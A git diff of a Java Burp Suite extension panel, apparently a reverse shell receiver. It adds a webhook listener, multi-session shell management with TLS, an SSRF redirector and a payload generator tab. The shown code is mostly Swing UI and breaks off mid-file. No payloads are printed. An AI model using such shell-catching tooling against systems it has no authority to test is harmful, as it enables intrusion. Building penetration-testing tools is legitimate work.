@@ -1,939 +1,1755 @@
 package burp;
 
+import burp.listener.MockRoute;
+import burp.listener.PortScanner;
+import burp.listener.PortScanner.PortInfo;
+import burp.listener.SessionManager;
+import burp.listener.ShellSession;
+import burp.listener.TlsSocketHelper;
+import burp.listener.WebhookResponseConfig;
+import burp.payload.PayloadCategory;
+import burp.payload.PayloadEncoder;
+import burp.payload.PayloadEncoder.EncodingType;
+import burp.payload.PayloadRegistry;
+import burp.payload.PayloadTemplate;
+import burp.payload.PayloadTemplate.PayloadParams;
+import burp.ui.AddressChip;
+import burp.ui.ModernButton;
+import burp.ui.UITheme;
+
 import javax.swing.*;
+import javax.swing.border.CompoundBorder;
 import javax.swing.border.EmptyBorder;
+import javax.swing.border.LineBorder;
 import javax.swing.border.TitledBorder;
+import javax.swing.event.DocumentEvent;
+import javax.swing.event.DocumentListener;
 import javax.swing.table.DefaultTableModel;
 import javax.swing.table.TableRowSorter;
-import javax.swing.text.Style;
-import javax.swing.text.StyleConstants;
-import javax.swing.text.StyledDocument;
 import java.awt.*;
 import java.awt.datatransfer.StringSelection;
-import java.awt.event.ActionListener;
+import java.awt.event.KeyAdapter;
+import java.awt.event.KeyEvent;
 import java.io.*;
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.SocketException;
-import java.net.URLEncoder;
+import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
-import java.util.ArrayList;
-import java.util.Base64;
-import java.util.Comparator;
-import java.util.Enumeration;
-import java.util.HashMap;
+import java.util.*;
 import java.util.List;
-import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 /**
- * Note: In Java, it is a convention for the public class name to match the
- * .java file name.
- * This file is named ReverseShellReceiverPanel.java.
+ * Modern, elegant, and icon-free management panel for Reverse Shell Receiver.
+ * Integrates dual-engine Listener, Multi-Session Shell Manager, TLS Sockets,
+ * Mock Routes/SSRF Redirector, and Extensive 40+ Payload Generator.
  */
 public class ReverseShellReceiverPanel extends JPanel {
 
-    private enum ShellType {
-        UNKNOWN,
-        UNIX,
-        WINDOWS_CMD,
-        WINDOWS_PS
-    }
-
-    private volatile ShellType shellType = ShellType.UNKNOWN;
-    private volatile String lastCommand = "";
-
     private final IBurpExtenderCallbacks callbacks;
     private final IExtensionHelpers helpers;
-    private JTextPane shellDisplayPane; // Renamed for clarity and upgraded from JTextArea
-    private Style styleNormal, styleInput, styleStatus; // Styles for the JTextPane
-    private JTextField portField;
-    private JTextField statusField;
+    private final ExecutorService ioExecutor = Executors.newCachedThreadPool();
+
+    // --- Listener Core State ---
     private volatile ServerSocket serverSocket;
+    private volatile boolean isListening = false;
+    private volatile int currentPort = -1;
     private Thread listenerThread;
-    private volatile boolean isListening;
-    private JButton startButton;
-    private JButton stopButton;
-    private JButton clearHistoryButton;
-    private JButton killPortsButton;
-    private JTable historyTable;
-    private DefaultTableModel tableModel;
-    private List<RequestEntry> requestHistory;
-    private TableRowSorter<DefaultTableModel> tableSorter;
-    private int currentPort = -1; // Track the current port used by the listener
+    private final WebhookResponseConfig webhookConfig = new WebhookResponseConfig();
+    private final SessionManager sessionManager;
+
+    // --- Listener Controls ---
     private JComboBox<String> modeCombo;
-    private JScrollPane tableScrollPane;
+    private JTextField portField;
+    private JCheckBox tlsCheckBox;
+    private ModernButton startButton;
+    private ModernButton stopButton;
+    private ModernButton clearHistoryButton;
+    private ModernButton configureResponseButton;
+    private ModernButton mockRoutesButton;
+    private ModernButton killPortsButton;
+
+    private JTextField statusField;
+    private JPanel ipListPanel;
+    private JLabel vpnWarningLabel;
+
+    private JPanel modeCardsPanel;
+    private static final String CARD_WEBHOOK = "CARD_WEBHOOK";
+    private static final String CARD_SHELL = "CARD_SHELL";
+
+    // Webhook UI
+    private DefaultTableModel webhookTableModel;
+    private JTable webhookTable;
+    private TableRowSorter<DefaultTableModel> webhookSorter;
+    private JTextField webhookFilterField;
+    private final List<RequestEntry> requestHistory = new ArrayList<>();
     private IMessageEditor requestViewer;
     private IMessageEditor responseViewer;
-    private JPanel modePanel;
-    private JScrollPane shellScrollPane;
-    private static final String WEBHOOK_CARD = "WEBHOOK";
-    private static final String SHELL_CARD = "SHELL";
-    private JPanel bottomPanel;
-    private JTextField inputField;
-    private JButton sendButton;
-    private JLabel promptLabel; // For the dynamic shell prompt
-    private Thread shellReaderThread; // For managing shell cleanup
-    private final ExecutorService ioExecutor = Executors.newCachedThreadPool();
-    private volatile Socket currentClient;
-    private volatile Socket clientSocket; // For reverse shell mode
-    private volatile PrintWriter shellOut;
 
-    // --- Payload Generator Components ---
+    // Shell UI & Multi-Session
+    private JPanel shellTerminalContainer;
+    private DefaultTableModel sessionTableModel;
+    private JTable sessionTable;
+    private JTextField shellInputField;
+    private ModernButton shellSendButton;
+    private ModernButton shellCtrlCButton;
+    private ModernButton shellClearButton;
+    private ModernButton uploadFileButton;
+    private ModernButton exportLogButton;
+    private ModernButton terminateSessionButton;
+    private JComboBox<String> quickCommandsCombo;
+    private JLabel shellStatusLabel;
+
+    // --- Payload Generator UI Components ---
+    private JTextField payloadSearchField;
     private JComboBox<String> payloadCategoryCombo;
-    private JComboBox<String> osCombo;
-    private JComboBox<String> shellTypeCombo;
-    private JComboBox<String> payloadTemplateCombo;
-    private JComboBox<String> ipCombo;
+    private JComboBox<String> payloadOsCombo;
+    private JComboBox<PayloadTemplate> payloadTemplateCombo;
+    private JComboBox<String> payloadIpCombo;
     private JTextField payloadPortField;
-    private JComboBox<String> encodingCombo;
+    private JTextField payloadShellField;
+    private JTextField payloadTargetFileField;
+    private JComboBox<EncodingType> payloadEncodingCombo;
+    private JTextArea payloadDescriptionArea;
     private ITextEditor payloadEditor;
-    private JPanel ipListPanel; // Clickable IP:port entries
-    private JLabel vpnWarningLabel; // VPN block warning
-    private JLabel shellTypeLabel, ipLabel, portLabel;
-    private volatile String currentRemotePath = "~"; // Track current directory
-    private volatile boolean isCapturingPath = false; // Internal flag
-    private Style stylePath;
-    private static final String PWD_MARKER_START = "___PWD_START___";
-    private static final String PWD_MARKER_END = "___PWD_END___";
-
-    private static void applyButtonStyle(JButton btn, Color bg) {
-        btn.setFont(new Font("Segoe UI", Font.BOLD, 12));
-        btn.setBackground(bg);
-        btn.setForeground(Color.WHITE);
-        btn.setFocusPainted(false);
-        btn.setBorderPainted(false);
-        btn.setOpaque(true);
-        btn.setContentAreaFilled(true);
-        btn.setCursor(new Cursor(Cursor.HAND_CURSOR));
-        btn.setBorder(new EmptyBorder(6, 14, 6, 14));
-        btn.addMouseListener(new java.awt.event.MouseAdapter() {
-            @Override public void mouseEntered(java.awt.event.MouseEvent e) { if (btn.isEnabled()) btn.setBackground(bg.darker()); }
-            @Override public void mouseExited(java.awt.event.MouseEvent e)  { btn.setBackground(bg); }
-        });
-    }
 
     public ReverseShellReceiverPanel(IBurpExtenderCallbacks callbacks) {
         this.callbacks = callbacks;
         this.helpers = callbacks.getHelpers();
-        this.requestHistory = new ArrayList<>();
-        setLayout(new BorderLayout(10, 10));
-        setBorder(new EmptyBorder(10, 10, 10, 10));
-        initComponents();
+        this.sessionManager = new SessionManager(ioExecutor, callbacks);
+
+        setLayout(new BorderLayout(8, 8));
+        setBorder(new EmptyBorder(8, 8, 8, 8));
+        setBackground(UITheme.PRIMARY_BG);
+
+        initSessionManagerListener();
+        initUI();
     }
 
-    private void initComponents() {
-        JTabbedPane tabbedPane = new JTabbedPane();
+    private void initSessionManagerListener() {
+        sessionManager.setListener(new SessionManager.ManagerListener() {
+            @Override
+            public void onSessionAdded(ShellSession session) {
+                SwingUtilities.invokeLater(() -> {
+                    updateSessionTable();
+                    statusField.setText("ACTIVE (" + sessionManager.getActiveSessionCount() + ")");
+                    statusField.setBackground(UITheme.STATUS_ACCENT);
+                });
+            }
 
-        // Listener Tab
-        JPanel mainPanel = new JPanel(new BorderLayout(5, 5));
-        mainPanel.setBorder(BorderFactory.createTitledBorder(
-                BorderFactory.createLineBorder(Color.GRAY, 1, true),
-                "Reverse Shell Receiver Listener",
-                TitledBorder.CENTER,
-                TitledBorder.TOP,
-                new Font("Arial", Font.BOLD, 14)));
+            @Override
+            public void onSessionSelected(ShellSession session) {
+                SwingUtilities.invokeLater(() -> {
+                    if (session != null) {
+                        displaySessionTerminal(session);
+                        shellStatusLabel.setText("SESSION #" + session.getId() + " - " + session.getRemoteAddress() + ":" + session.getRemotePort() + " [" + session.getShellType().getLabel() + "]");
+                        shellInputField.setEnabled(session.isActive());
+                        shellSendButton.setEnabled(session.isActive());
+                        shellCtrlCButton.setEnabled(session.isActive());
+                        uploadFileButton.setEnabled(session.isActive());
+                        exportLogButton.setEnabled(true);
+                        terminateSessionButton.setEnabled(session.isActive());
+                        shellInputField.requestFocusInWindow();
+                    } else {
+                        shellTerminalContainer.removeAll();
+                        shellTerminalContainer.revalidate();
+                        shellTerminalContainer.repaint();
+                        shellStatusLabel.setText("STATUS: NO ACTIVE SESSION");
+                        shellInputField.setEnabled(false);
+                        shellSendButton.setEnabled(false);
+                        shellCtrlCButton.setEnabled(false);
+                        uploadFileButton.setEnabled(false);
+                        exportLogButton.setEnabled(false);
+                        terminateSessionButton.setEnabled(false);
+                    }
+                    updateSessionTable();
+                });
+            }
 
-        // Top panel for controls and status
-        JPanel topPanel = new JPanel(new BorderLayout(5, 5));
+            @Override
+            public void onSessionRemoved(ShellSession session) {
+                SwingUtilities.invokeLater(() -> {
+                    updateSessionTable();
+                    int active = sessionManager.getActiveSessionCount();
+                    if (active > 0) {
+                        statusField.setText("ACTIVE (" + active + ")");
+                        statusField.setBackground(UITheme.STATUS_ACCENT);
+                    } else if (isListening) {
+                        statusField.setText("ONLINE");
+                        statusField.setBackground(UITheme.STATUS_SUCCESS);
+                    }
+                });
+            }
 
-        // Control panel — left: config, right: action buttons
-        JPanel controlPanel = new JPanel(new BorderLayout(0, 0));
-        controlPanel.setBorder(new EmptyBorder(6, 8, 6, 8));
+            @Override
+            public void onSessionStateChanged() {
+                SwingUtilities.invokeLater(() -> {
+                    updateSessionTable();
+                    ShellSession current = sessionManager.getActiveSession();
+                    if (current != null) {
+                        shellStatusLabel.setText("SESSION #" + current.getId() + " - " + current.getRemoteAddress() + ":" + current.getRemotePort() + " [" + current.getShellType().getLabel() + "]");
+                    }
+                    int active = sessionManager.getActiveSessionCount();
+                    if (active > 0) {
+                        statusField.setText("ACTIVE (" + active + ")");
+                        statusField.setBackground(UITheme.STATUS_ACCENT);
+                    } else if (isListening) {
+                        statusField.setText("ONLINE");
+                        statusField.setBackground(UITheme.STATUS_SUCCESS);
+                    }
+                });
+            }
+        });
+    }
 
-        JPanel configPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 3));
-        JLabel modeLabel = new JLabel("Mode:");
-        modeLabel.setFont(new Font("Segoe UI", Font.BOLD, 12));
+    private void initUI() {
+        JTabbedPane mainTabs = new JTabbedPane();
+        mainTabs.setFont(UITheme.FONT_TITLE);
+
+        // Tab 1: Listener
+        JPanel listenerTab = createListenerTab();
+        mainTabs.addTab("Listener", listenerTab);
+
+        // Tab 2: Payload Generator
+        JPanel payloadTab = createPayloadGeneratorTab();
+        mainTabs.addTab("Payload Generator", payloadTab);
+
+        add(mainTabs, BorderLayout.CENTER);
+    }
+
+    // =========================================================================
+    // LISTENER TAB BUILDER
+    // =========================================================================
+    private JPanel createListenerTab() {
+        JPanel panel = new JPanel(new BorderLayout(8, 8));
+        panel.setOpaque(false);
+
+        // --- Top Control & Status Section ---
+        JPanel topSection = new JPanel(new BorderLayout(0, 8));
+        topSection.setOpaque(false);
+
+        // 1. Control Bar
+        JPanel controlBar = new JPanel(new BorderLayout(8, 0));
+        controlBar.setBackground(UITheme.CARD_BG);
+        controlBar.setBorder(UITheme.createCardBorder());
+
+        // Left Controls (Mode, Port, TLS)
+        JPanel leftControls = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
+        leftControls.setOpaque(false);
+
+        JLabel modeLabel = new JLabel("MODE:");
+        modeLabel.setFont(UITheme.FONT_SUBTITLE);
+        modeLabel.setForeground(UITheme.TEXT_SECONDARY);
+
         modeCombo = new JComboBox<>(new String[] { "HTTP Webhook", "Reverse Shell" });
-        modeCombo.setFont(new Font("Segoe UI", Font.PLAIN, 12));
-        modeCombo.setPreferredSize(new Dimension(145, 28));
+        UITheme.styleComboBox(modeCombo);
+        modeCombo.setPreferredSize(new Dimension(140, 28));
 
-        JLabel portLabelText = new JLabel("Port:");
-        portLabelText.setFont(new Font("Segoe UI", Font.BOLD, 12));
+        JLabel portLabel = new JLabel("PORT:");
+        portLabel.setFont(UITheme.FONT_SUBTITLE);
+        portLabel.setForeground(UITheme.TEXT_SECONDARY);
+
         portField = new JTextField("8080", 6);
-        portField.setFont(new Font("Segoe UI", Font.PLAIN, 12));
-        portField.setPreferredSize(new Dimension(72, 28));
+        UITheme.styleTextField(portField);
+        portField.setPreferredSize(new Dimension(68, 28));
 
-        configPanel.add(modeLabel);
-        configPanel.add(modeCombo);
-        configPanel.add(Box.createHorizontalStrut(6));
-        configPanel.add(portLabelText);
-        configPanel.add(portField);
+        tlsCheckBox = new JCheckBox("TLS/SSL Socket");
+        tlsCheckBox.setFont(UITheme.FONT_SMALL);
+        tlsCheckBox.setOpaque(false);
+        tlsCheckBox.setForeground(UITheme.TEXT_SECONDARY);
+        tlsCheckBox.setToolTipText("Enable SSL/TLS listener socket for encrypted reverse shells or HTTPS webhook");
 
-        JPanel actionPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 5, 3));
-        startButton = new JButton("Start");
-        stopButton = new JButton("Stop");
-        clearHistoryButton = new JButton("Clear History");
-        killPortsButton = new JButton("Kill Ports");
+        leftControls.add(modeLabel);
+        leftControls.add(modeCombo);
+        leftControls.add(Box.createHorizontalStrut(4));
+        leftControls.add(portLabel);
+        leftControls.add(portField);
+        leftControls.add(tlsCheckBox);
 
-        applyButtonStyle(startButton, new Color(39, 174, 96));
-        applyButtonStyle(stopButton, new Color(192, 57, 43));
-        applyButtonStyle(clearHistoryButton, new Color(41, 128, 185));
-        applyButtonStyle(killPortsButton, new Color(211, 84, 0));
+        // Right Actions (Buttons)
+        JPanel rightActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 4));
+        rightActions.setOpaque(false);
+
+        startButton = new ModernButton("START", UITheme.STATUS_SUCCESS);
+        stopButton = new ModernButton("STOP", UITheme.STATUS_DANGER);
+        mockRoutesButton = new ModernButton("MOCK ROUTES & SSRF", new Color(71, 85, 105));
+        configureResponseButton = new ModernButton("CONFIGURE RESPONSE", new Color(71, 85, 105));
+        clearHistoryButton = new ModernButton("CLEAR HISTORY", UITheme.STATUS_INFO);
+        killPortsButton = new ModernButton("KILL PORTS", UITheme.STATUS_WARNING);
 
         stopButton.setEnabled(false);
         clearHistoryButton.setEnabled(false);
 
         startButton.addActionListener(e -> startListener());
         stopButton.addActionListener(e -> ioExecutor.submit(this::stopListener));
+        mockRoutesButton.addActionListener(e -> showMockRoutesDialog());
+        configureResponseButton.addActionListener(e -> showResponseConfigDialog());
         clearHistoryButton.addActionListener(e -> clearHistory());
         killPortsButton.addActionListener(e -> killUsedPorts());
 
-        JSeparator btnSep = new JSeparator(JSeparator.VERTICAL);
-        btnSep.setPreferredSize(new Dimension(1, 22));
+        rightActions.add(startButton);
+        rightActions.add(stopButton);
+        rightActions.add(mockRoutesButton);
+        rightActions.add(configureResponseButton);
+        rightActions.add(clearHistoryButton);
+        rightActions.add(killPortsButton);
 
-        actionPanel.add(startButton);
-        actionPanel.add(stopButton);
-        actionPanel.add(btnSep);
-        actionPanel.add(clearHistoryButton);
-        actionPanel.add(killPortsButton);
+        controlBar.add(leftControls, BorderLayout.WEST);
+        controlBar.add(rightActions, BorderLayout.EAST);
 
-        controlPanel.add(configPanel, BorderLayout.WEST);
-        controlPanel.add(actionPanel, BorderLayout.EAST);
+        // 2. Status Card
+        JPanel statusCard = new JPanel(new BorderLayout(14, 0));
+        statusCard.setBackground(UITheme.CARD_BG);
+        statusCard.setBorder(UITheme.createCardBorder());
 
-        // --- Listener Status Card ---
-        JPanel statusCard = new JPanel(new BorderLayout(0, 0));
-        statusCard.setBackground(new Color(248, 249, 251));
-        statusCard.setBorder(BorderFactory.createCompoundBorder(
-                BorderFactory.createLineBorder(new Color(218, 220, 224), 1, true),
-                new EmptyBorder(10, 14, 8, 14)));
-
-        // LEFT column: badge pill + subtitle
+        // Status Badge Column
         JPanel statusLeft = new JPanel();
         statusLeft.setLayout(new BoxLayout(statusLeft, BoxLayout.Y_AXIS));
         statusLeft.setOpaque(false);
-        statusLeft.setPreferredSize(new Dimension(112, 0));
+        statusLeft.setPreferredSize(new Dimension(110, 0));
 
         statusField = new JTextField("OFFLINE");
         statusField.setEditable(false);
         statusField.setOpaque(true);
-        statusField.setBackground(new Color(192, 57, 43));
+        statusField.setBackground(UITheme.STATUS_DANGER);
         statusField.setForeground(Color.WHITE);
-        statusField.setFont(new Font("Segoe UI", Font.BOLD, 12));
+        statusField.setFont(UITheme.FONT_TITLE);
         statusField.setHorizontalAlignment(JTextField.CENTER);
-        statusField.setBorder(BorderFactory.createEmptyBorder(3, 0, 3, 0));
-        statusField.setMaximumSize(new Dimension(96, 26));
+        statusField.setBorder(BorderFactory.createEmptyBorder(4, 0, 4, 0));
+        statusField.setMaximumSize(new Dimension(100, 26));
         statusField.setAlignmentX(Component.LEFT_ALIGNMENT);
 
-        JLabel statusSubLabel = new JLabel("Listener Status");
-        statusSubLabel.setFont(new Font("Segoe UI", Font.PLAIN, 10));
-        statusSubLabel.setForeground(new Color(160, 160, 160));
-        statusSubLabel.setAlignmentX(Component.LEFT_ALIGNMENT);
+        JLabel statusSub = new JLabel("LISTENER STATUS");
+        statusSub.setFont(UITheme.FONT_BADGE);
+        statusSub.setForeground(UITheme.TEXT_MUTED);
+        statusSub.setAlignmentX(Component.LEFT_ALIGNMENT);
 
         statusLeft.add(statusField);
-        statusLeft.add(Box.createVerticalStrut(5));
-        statusLeft.add(statusSubLabel);
+        statusLeft.add(Box.createVerticalStrut(4));
+        statusLeft.add(statusSub);
 
-        // RIGHT section: header + chip flow, with left-border as divider
-        JPanel ipSection = new JPanel(new BorderLayout(0, 4));
-        ipSection.setOpaque(false);
-        ipSection.setBorder(BorderFactory.createCompoundBorder(
-                BorderFactory.createMatteBorder(0, 1, 0, 0, new Color(218, 220, 224)),
+        // Listening Addresses Column
+        JPanel statusRight = new JPanel(new BorderLayout(0, 3));
+        statusRight.setOpaque(false);
+        statusRight.setBorder(BorderFactory.createCompoundBorder(
+                BorderFactory.createMatteBorder(0, 1, 0, 0, UITheme.BORDER_LIGHT),
                 new EmptyBorder(0, 14, 0, 0)));
 
-        JLabel addrHeader = new JLabel("Listening Addresses");
-        addrHeader.setFont(new Font("Segoe UI", Font.BOLD, 11));
-        addrHeader.setForeground(new Color(90, 90, 90));
+        JLabel addrHeader = new JLabel("LISTENING ADDRESSES");
+        addrHeader.setFont(UITheme.FONT_BADGE);
+        addrHeader.setForeground(UITheme.TEXT_SECONDARY);
 
-        ipListPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 3));
+        ipListPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
         ipListPanel.setOpaque(false);
-        JLabel waitingLabel = new JLabel("Waiting for listener to start...");
-        waitingLabel.setFont(new Font("Segoe UI", Font.ITALIC, 11));
-        waitingLabel.setForeground(new Color(175, 175, 175));
+        JLabel waitingLabel = new JLabel("Listener is currently inactive.");
+        waitingLabel.setFont(UITheme.FONT_SMALL);
+        waitingLabel.setForeground(UITheme.TEXT_MUTED);
         ipListPanel.add(waitingLabel);
 
-        ipSection.add(addrHeader, BorderLayout.NORTH);
-        ipSection.add(ipListPanel, BorderLayout.CENTER);
-
         vpnWarningLabel = new JLabel(" ");
-        vpnWarningLabel.setFont(new Font("Segoe UI", Font.ITALIC, 10));
-        vpnWarningLabel.setForeground(new Color(160, 160, 160));
-        vpnWarningLabel.setBorder(new EmptyBorder(2, 0, 0, 0));
+        vpnWarningLabel.setFont(UITheme.FONT_SMALL);
+        vpnWarningLabel.setForeground(UITheme.TEXT_MUTED);
 
-        JPanel rightSection = new JPanel(new BorderLayout(0, 0));
-        rightSection.setOpaque(false);
-        rightSection.add(ipSection, BorderLayout.CENTER);
-        rightSection.add(vpnWarningLabel, BorderLayout.SOUTH);
+        statusRight.add(addrHeader, BorderLayout.NORTH);
+        statusRight.add(ipListPanel, BorderLayout.CENTER);
+        statusRight.add(vpnWarningLabel, BorderLayout.SOUTH);
 
         statusCard.add(statusLeft, BorderLayout.WEST);
-        statusCard.add(rightSection, BorderLayout.CENTER);
+        statusCard.add(statusRight, BorderLayout.CENTER);
 
-        topPanel.add(controlPanel, BorderLayout.NORTH);
-        topPanel.add(statusCard, BorderLayout.CENTER);
+        topSection.add(controlBar, BorderLayout.NORTH);
+        topSection.add(statusCard, BorderLayout.CENTER);
+        panel.add(topSection, BorderLayout.NORTH);
 
-        mainPanel.add(topPanel, BorderLayout.NORTH);
+        // --- Center Display: CardLayout for Webhook & Shell ---
+        modeCardsPanel = new JPanel(new CardLayout());
+        modeCardsPanel.setOpaque(false);
 
-        // Center panel for history and request viewer
-        JPanel centerPanel = new JPanel(new BorderLayout(5, 5));
+        JPanel webhookCard = createWebhookPanel();
+        JPanel shellCard = createShellPanel();
 
-        // History table
-        String[] columns = { "#", "Method", "URL", "Time" };
-        tableModel = new DefaultTableModel(columns, 0) {
-            @Override
-            public boolean isCellEditable(int row, int column) {
-                return false; // Make table non-editable
+        modeCardsPanel.add(webhookCard, CARD_WEBHOOK);
+        modeCardsPanel.add(shellCard, CARD_SHELL);
+
+        modeCombo.addActionListener(e -> {
+            String selectedMode = (String) modeCombo.getSelectedItem();
+            CardLayout cl = (CardLayout) modeCardsPanel.getLayout();
+            if ("Reverse Shell".equals(selectedMode)) {
+                cl.show(modeCardsPanel, CARD_SHELL);
+                configureResponseButton.setVisible(false);
+                mockRoutesButton.setVisible(false);
+                clearHistoryButton.setVisible(false);
+            } else {
+                cl.show(modeCardsPanel, CARD_WEBHOOK);
+                configureResponseButton.setVisible(true);
+                mockRoutesButton.setVisible(true);
+                clearHistoryButton.setVisible(true);
             }
-        };
-        historyTable = new JTable(tableModel);
-        historyTable.setFont(new Font("Arial", Font.PLAIN, 12));
-        historyTable.getTableHeader().setFont(new Font("Arial", Font.BOLD, 12));
-        historyTable.setRowHeight(20);
-        historyTable.getColumnModel().getColumn(0).setPreferredWidth(50); // Index
-        historyTable.getColumnModel().getColumn(1).setPreferredWidth(100); // Method
-        historyTable.getColumnModel().getColumn(2).setPreferredWidth(400); // URL
-        historyTable.getColumnModel().getColumn(3).setPreferredWidth(150); // Time
-
-        // Enable sorting
-        tableSorter = new TableRowSorter<>(tableModel);
-        historyTable.setRowSorter(tableSorter);
-
-        // Custom comparator for Time column
-        tableSorter.setComparator(3, (String t1, String t2) -> {
-            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
-            LocalDateTime time1 = LocalDateTime.parse(t1, formatter);
-            LocalDateTime time2 = LocalDateTime.parse(t2, formatter);
-            return time1.compareTo(time2);
         });
 
-        // Numeric comparator for Index column
-        tableSorter.setComparator(0, Comparator.comparingInt(o -> Integer.parseInt(o.toString())));
+        panel.add(modeCardsPanel, BorderLayout.CENTER);
+        return panel;
+    }
 
-        historyTable.getSelectionModel().addListSelectionListener(e -> {
+    // =========================================================================
+    // WEBHOOK PANEL BUILDER
+    // =========================================================================
+    private JPanel createWebhookPanel() {
+        JPanel panel = new JPanel(new BorderLayout(0, 6));
+        panel.setOpaque(false);
+
+        // Filter / Search Toolbar
+        JPanel filterBar = new JPanel(new BorderLayout(8, 0));
+        filterBar.setBackground(UITheme.CARD_BG);
+        filterBar.setBorder(new EmptyBorder(4, 8, 4, 8));
+
+        JLabel filterLabel = new JLabel("FILTER REQUESTS:");
+        filterLabel.setFont(UITheme.FONT_SUBTITLE);
+        filterLabel.setForeground(UITheme.TEXT_SECONDARY);
+
+        webhookFilterField = new JTextField();
+        UITheme.styleTextField(webhookFilterField);
+        webhookFilterField.setToolTipText("Filter by Method, Path, Client IP, or Timestamp");
+
+        ModernButton clearFilterBtn = new ModernButton("RESET", new Color(100, 116, 139));
+        clearFilterBtn.addActionListener(e -> webhookFilterField.setText(""));
+
+        filterBar.add(filterLabel, BorderLayout.WEST);
+        filterBar.add(webhookFilterField, BorderLayout.CENTER);
+        filterBar.add(clearFilterBtn, BorderLayout.EAST);
+
+        // Webhook History Table
+        String[] columns = { "#", "Method", "Path / URL", "Client IP", "Size", "Time" };
+        webhookTableModel = new DefaultTableModel(columns, 0) {
+            @Override public boolean isCellEditable(int row, int col) { return false; }
+        };
+
+        webhookTable = new JTable(webhookTableModel);
+        webhookTable.setFont(UITheme.FONT_CODE);
+        webhookTable.getTableHeader().setFont(UITheme.FONT_TITLE);
+        webhookTable.setRowHeight(24);
+        webhookTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
+        webhookTable.setShowGrid(true);
+        webhookTable.setGridColor(UITheme.BORDER_LIGHT);
+
+        webhookTable.getColumnModel().getColumn(0).setPreferredWidth(50);
+        webhookTable.getColumnModel().getColumn(1).setPreferredWidth(80);
+        webhookTable.getColumnModel().getColumn(2).setPreferredWidth(350);
+        webhookTable.getColumnModel().getColumn(3).setPreferredWidth(120);
+        webhookTable.getColumnModel().getColumn(4).setPreferredWidth(80);
+        webhookTable.getColumnModel().getColumn(5).setPreferredWidth(150);
+
+        webhookSorter = new TableRowSorter<>(webhookTableModel);
+        webhookTable.setRowSorter(webhookSorter);
+
+        javax.swing.Timer webhookFilterTimer = new javax.swing.Timer(150, evt -> {
+            String text = webhookFilterField.getText().trim();
+            if (text.isEmpty()) {
+                webhookSorter.setRowFilter(null);
+            } else {
+                webhookSorter.setRowFilter(RowFilter.regexFilter("(?i)" + Pattern.quote(text)));
+            }
+        });
+        webhookFilterTimer.setRepeats(false);
+
+        webhookFilterField.getDocument().addDocumentListener(new DocumentListener() {
+            @Override public void insertUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
+            @Override public void removeUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
+            @Override public void changedUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
+        });
+
+        webhookTable.getSelectionModel().addListSelectionListener(e -> {
             if (!e.getValueIsAdjusting()) {
-                int viewRow = historyTable.getSelectedRow();
+                int viewRow = webhookTable.getSelectedRow();
                 if (viewRow >= 0) {
-                    int modelRow = historyTable.convertRowIndexToModel(viewRow);
+                    int modelRow = webhookTable.convertRowIndexToModel(viewRow);
                     if (modelRow < requestHistory.size()) {
                         RequestEntry entry = requestHistory.get(modelRow);
                         requestViewer.setMessage(entry.fullRequest != null ? entry.fullRequest : new byte[0], true);
-                        if (responseViewer != null) {
-                            responseViewer.setMessage(entry.fullResponse != null ? entry.fullResponse : new byte[0], false);
-                        }
+                        responseViewer.setMessage(entry.fullResponse != null ? entry.fullResponse : new byte[0], false);
                     }
                 }
             }
         });
 
-        // 1. Webhook Mode - SplitPane (Table + Editor)
-        // Table scroll pane
-        tableScrollPane = new JScrollPane(historyTable);
-        tableScrollPane.setBorder(null); // Border handled by SplitPane or parent
+        JScrollPane tableScroll = new JScrollPane(webhookTable);
+        tableScroll.setBorder(new LineBorder(UITheme.BORDER_LIGHT, 1));
+        tableScroll.getViewport().setBackground(Color.WHITE);
 
-        // Native Burp message editors — request (left) and response (right)
+        // Native Burp Message Editors
         requestViewer = callbacks.createMessageEditor(this.requestController, false);
         responseViewer = callbacks.createMessageEditor(this.requestController, false);
         callbacks.customizeUiComponent(requestViewer.getComponent());
         callbacks.customizeUiComponent(responseViewer.getComponent());
 
-        // Add "Request" / "Response" labels above each editor
-        JPanel requestPanel = new JPanel(new BorderLayout());
-        JLabel reqLabel = new JLabel("  Request");
-        reqLabel.setFont(new Font("Segoe UI", Font.BOLD, 11));
-        reqLabel.setForeground(new Color(80, 80, 80));
-        reqLabel.setBorder(new EmptyBorder(4, 4, 4, 4));
-        reqLabel.setOpaque(true);
-        reqLabel.setBackground(new Color(238, 240, 245));
-        requestPanel.add(reqLabel, BorderLayout.NORTH);
-        requestPanel.add(requestViewer.getComponent(), BorderLayout.CENTER);
+        JPanel reqPanel = new JPanel(new BorderLayout());
+        JLabel reqTitle = new JLabel(" INBOUND REQUEST");
+        reqTitle.setFont(UITheme.FONT_SUBTITLE);
+        reqTitle.setForeground(UITheme.TEXT_SECONDARY);
+        reqTitle.setBorder(new EmptyBorder(4, 4, 4, 4));
+        reqTitle.setOpaque(true);
+        reqTitle.setBackground(UITheme.CARD_HEADER_BG);
+        reqPanel.add(reqTitle, BorderLayout.NORTH);
+        reqPanel.add(requestViewer.getComponent(), BorderLayout.CENTER);
 
-        JPanel responsePanel = new JPanel(new BorderLayout());
-        JLabel respLabel = new JLabel("  Response");
-        respLabel.setFont(new Font("Segoe UI", Font.BOLD, 11));
-        respLabel.setForeground(new Color(80, 80, 80));
-        respLabel.setBorder(new EmptyBorder(4, 4, 4, 4));
-        respLabel.setOpaque(true);
-        respLabel.setBackground(new Color(238, 240, 245));
-        responsePanel.add(respLabel, BorderLayout.NORTH);
-        responsePanel.add(responseViewer.getComponent(), BorderLayout.CENTER);
+        JPanel respPanel = new JPanel(new BorderLayout());
+        JLabel respTitle = new JLabel(" RETURNED RESPONSE");
+        respTitle.setFont(UITheme.FONT_SUBTITLE);
